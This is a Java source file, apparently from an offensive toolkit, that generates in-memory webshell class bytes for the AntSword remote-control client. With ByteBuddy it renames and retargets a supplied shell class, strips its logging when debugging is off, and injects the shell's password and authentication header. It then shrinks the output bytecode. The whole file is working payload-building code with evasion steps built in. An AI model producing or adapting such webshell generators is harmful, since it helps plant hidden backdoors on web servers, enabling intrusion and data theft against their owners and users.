package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.AntSwordConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.lang3.StringUtils;

import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordGenerator {
    private final ShellConfig shellConfig;
    private final AntSwordConfig antSwordConfig;

    public AntSwordGenerator(ShellConfig shellConfig, AntSwordConfig antSwordConfig) {
        this.shellConfig = shellConfig;
        this.antSwordConfig = antSwordConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (antSwordConfig.getShellClass() == null) {
            throw new IllegalArgumentException("antSwordConfig.getClazz() == null");
        }
        if (StringUtils.isBlank(antSwordConfig.getPass())) {
            throw new IllegalArgumentException("antSwordConfig.getPass().isBlank()");
        }
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(antSwordConfig.getShellClass())
                .name(antSwordConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        return builder.field(named("pass")).value(antSwordConfig.getPass())
                    .field(named("headerName")).value(antSwordConfig.getHeaderName())
                    .field(named("headerValue")).value(antSwordConfig.getHeaderValue());
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}
